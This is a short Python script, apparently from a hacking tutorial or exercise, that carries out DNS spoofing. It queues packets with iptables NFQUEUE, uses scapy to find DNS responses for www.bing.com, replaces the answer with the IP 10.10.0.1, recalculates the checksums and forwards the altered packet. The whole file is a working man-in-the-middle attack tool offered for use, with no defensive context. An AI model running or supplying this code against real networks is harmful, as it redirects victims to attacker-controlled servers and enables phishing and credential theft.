#!/use/bin/env python
# iptables -I [FORWARD, OUTPUT, ] -j NFQUEUE --queue-num [number] ===> create queue for num is 0
# iptables --flush   ====> you must to off the queue after this


import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # to show output packet in shape can i read it
    if scapy_packet.haslayer(scapy.DNSRR):  # to give me DNS for scapy_packet has
      qname = scapy_packet[scapy.DNSQR].qname.decode()   # give me domain name i search it as "www.bing.com"
      if "www.bing.com" in qname:
          print("[+] spoofing target ")
          answer = scapy.DNSRR(rrname=qname, rdata="10.10.0.1")  #redirected domain to another website by use ip fack "10.10.0.1"
          scapy_packet[scapy.DNS].an=answer     # put the spoof answer i created
          scapy_packet[scapy.DNS].ancount=1

          del scapy_packet[scapy.IP].len     # delete element is not important
          del scapy_packet[scapy.IP].chksum
          del scapy_packet[scapy.UDP].len
          del scapy_packet[scapy.UDP].chksum

          packet.set_payload(bytes(scapy_packet))  # run and send packet after modify

    packet.accept()

queue = netfilterqueue.NetfilterQueue()  # create queue
queue.bind(0, process_packet)   # connect queue to queue number 0 and what i do in this packet

try:
    print("[+] waiting for data ...")
    queue.run()
except KeyboardInterrupt:
    print("[-] detecting CTRL+C  ....... flushing iptables!!! ")
    # """
    # import os
    # os.system("iptables --flush")
    # """
    import subprocess
    subprocess.call("iptables --flush")




















